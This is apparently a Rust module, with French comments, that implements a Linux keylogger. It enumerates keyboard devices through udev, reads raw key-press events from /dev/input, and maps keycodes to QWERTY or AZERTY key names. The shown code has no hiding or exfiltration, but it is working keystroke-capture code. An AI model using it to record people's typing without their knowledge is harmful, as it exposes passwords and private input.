use byteorder::{NativeEndian, ReadBytesExt};
// use libc::GENL_ID_VFS_DQUOT;
use std::{
    collections::HashMap,
    fs::File,
    fs::OpenOptions,
    io::{self, BufRead, BufReader, Cursor, Read, Write},
    path::Path,
};
use udev::Enumerator;

/// Initializes the keylogger and checks if the keyboard is QWERTY or AZERTY.
///
/// # Arguments
///
/// * `is_qwerty` - A mutable reference to a boolean indicating if the keyboard is QWERTY.
///
/// # Returns
///
/// * `HashMap<u16, String>` - A map of keycodes to key names.
pub fn init_keylogger(is_qwerty: &mut bool) -> HashMap<u16, String> {
    // Charger la carte de correspondance de touches
    let file_path = "/usr/include/linux/input-event-codes.h";
    let mut keycode_map: HashMap<u16, String> = create_keycode_map_from_file(file_path);

    *is_qwerty = input_qwerty_azerty(&mut keycode_map);

    keycode_map
}

/// Creates a keycode map from the given file.
///
/// # Arguments
///
/// * `file_path` - The path to the file containing keycodes.
///
/// # Returns
///
/// * `HashMap<u16, String>` - A map of keycodes to key names.
fn create_keycode_map_from_file(file_path: &str) -> HashMap<u16, String> {
    let mut keycode_map = HashMap::new();

    let path = Path::new(file_path);
    let file = File::open(path).expect("Impossible d'ouvrir le fichier");

    let reader = BufReader::new(file);

    for line in reader.lines() {
        if let Ok(line) = line {
            // Vérifie si la lecture de la ligne a réussi
            if let Some(pos) = line.find("KEY_") {
                // Extraction du nom de la touche après "KEY_"
                let key_name_opt = line[pos + 4..].split_whitespace().next();
                if let Some(key_name) = key_name_opt {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if let Some(keycode_str) = parts.last() {
                        // Récupère la dernière partie de la ligne
                        if let Ok(keycode) = keycode_str.parse::<u16>() {
                            // Ajoute l'entrée dans la table des keycodes
                            keycode_map.insert(keycode, key_name.to_string());
                        }
                    }
                }
            }
        }
    }

    keycode_map
}

/// Checks if the keyboard is QWERTY or AZERTY.
///
/// # Arguments
///
/// * `keycode_map` - A mutable reference to the keycode map.
///
/// # Returns
///
/// * `bool` - Returns true if the keyboard is QWERTY, false if AZERTY.
fn input_qwerty_azerty(keycode_map: &mut HashMap<u16, String>) -> bool {
    print!("Votre clavier est-il en (Q)WERTY ou (A)ZERTY ? ");
    io::stdout().flush().ok(); // Force l'affichage immédiat du message

    let mut input = String::new();
    if io::stdin().read_line(&mut input).is_err() {
        println!("Erreur lors de la lecture de l'entrée. Supposons QWERTY par défaut.");
        return true;
    }
    let input = input.trim().to_uppercase();

    // let input = "A".to_string();

    if input == "A" {
        println!("Conversion du clavier en AZERTY...");
        convert_qwerty_to_azerty(keycode_map);
        false
    } else if input != "Q" {
        println!("Réponse non valide...");
        input_qwerty_azerty(keycode_map)
    } else {
        true
    }
}

/// Converts a QWERTY keycode map to AZERTY.
///
/// # Arguments
///
/// * `keycode_map` - A mutable reference to the keycode map.
fn convert_qwerty_to_azerty(keycode_map: &mut HashMap<u16, String>) {
    // Mappage QWERTY -> AZERTY
    let qwerty_to_azerty: HashMap<&str, &str> = [
        ("Q", "A"),
        ("W", "Z"),
        ("A", "Q"),
        ("S", "S"),
        ("D", "D"),
        ("F", "F"),
        ("G", "G"),
        ("H", "H"),
        ("J", "J"),
        ("K", "K"),
        ("L", "L"),
        ("SEMICOLON", "M"),
        ("N", "N"),
        ("O", "O"),
        ("P", "P"),
        ("R", "R"),
        ("T", "T"),
        ("Y", "Y"),
        ("U", "U"),
        ("I", "I"),
        ("O", "O"),
        ("P", "P"),
        ("Z", "W"),
        ("2", "é"),
        ("4", "'"),
        ("7", "è"),
        ("9", "ç"),
        ("0", "à"),
        ("APOSTROPHE", "ù"),
    ]
    .iter()
    .cloned()
    .collect();

    // Parcourir le HashMap QWERTY et échanger les touches selon la conversion
    for (_keycode, letter) in keycode_map.iter_mut() {
        if let Some(azerty_letter) = qwerty_to_azerty.get(letter.as_str()) {
            *letter = azerty_letter.to_string(); // Modifie la valeur en place
        }
    }
}

/// Lists all keyboards connected to the system.
///
/// # Returns
///
/// * `Vec<String>` - A list of device paths for keyboards.
pub fn list_keyboards() -> Vec<String> {
    let mut devices = Vec::new();

    if let Ok(mut enumerator) = Enumerator::new() {
        if enumerator.match_subsystem("input").is_ok() {
            if let Ok(device_iter) = enumerator.scan_devices() {
                devices = device_iter
                    .filter_map(|device| {
                        if let Some(properties) = device.property_value("ID_INPUT_KEYBOARD") {
                            if properties == "1" {
                                return device.devnode().map(|p| p.to_string_lossy().into_owned());
                            }
                        }
                        None
                    })
                    .collect();
            }
        }
    }

    // Suppression du dernier clavier (le clavier virtuel que j'ai créé)
    devices.pop();

    devices
}

/// Reads key press events from the given file path.
///
/// # Arguments
///
/// * `path` - The path to the input device file.
/// * `keycode_map` - A map of keycodes to key names.
///
/// # Returns
///
/// * `Option<String>` - The name of the pressed key, or None if no key is pressed.
pub fn get_pressed_key(path: &Path, keycode_map: &HashMap<u16, String>) -> Option<String> {
    let mut file_options = OpenOptions::new();
    file_options.read(true).write(false).create(false);

    let mut event_file = match file_options.open(path) {
        Ok(file) => file,
        Err(err) => {
            eprintln!("Erreur lors de l'ouverture du fichier {:?} : {}", path, err);
            return None;
        }
    };

    let mut packet = [0u8; 24];
    loop {
        if let Err(err) = event_file.read_exact(&mut packet) {
            eprintln!(
                "Erreur lors de la lecture des données dans {:?} : {}",
                path, err
            );
            return None; // Continue to the next iteration for this path
        }

        let mut rdr = Cursor::new(packet);
        let _tv_sec = match rdr.read_u64::<NativeEndian>() {
            Ok(val) => val,
            Err(err) => {
                eprintln!("Erreur de lecture _tv_sec dans {:?} : {}", path, err);
                continue;
            }
        };
        let _tv_usec = match rdr.read_u64::<NativeEndian>() {
            Ok(val) => val,
            Err(err) => {
                eprintln!("Erreur de lecture _tv_usec dans {:?} : {}", path, err);
                continue;
            }
        };
        let evtype = match rdr.read_u16::<NativeEndian>() {
            Ok(val) => val,
            Err(err) => {
                eprintln!("Erreur de lecture evtype dans {:?} : {}", path, err);
                continue;
            }
        };
        let code = match rdr.read_u16::<NativeEndian>() {
            Ok(val) => val,
            Err(err) => {
                eprintln!("Erreur de lecture code dans {:?} : {}", path, err);
                continue;
            }
        };
        let value = match rdr.read_i32::<NativeEndian>() {
            Ok(val) => val,
            Err(err) => {
                eprintln!("Erreur de lecture value dans {:?} : {}", path, err);
                continue;
            }
        };

        if evtype == 1 && value == 1 {
            // Vérifie si c'est un événement de type touche (EV_KEY)
            if let Some(letter) = keycode_map.get(&code) {
                return Some(letter.clone());
            } else {
                eprintln!(
                    "Chemin {:?} : Aucune lettre trouvée pour le keycode {}",
                    path, code
                );
            }
        }
    }
}
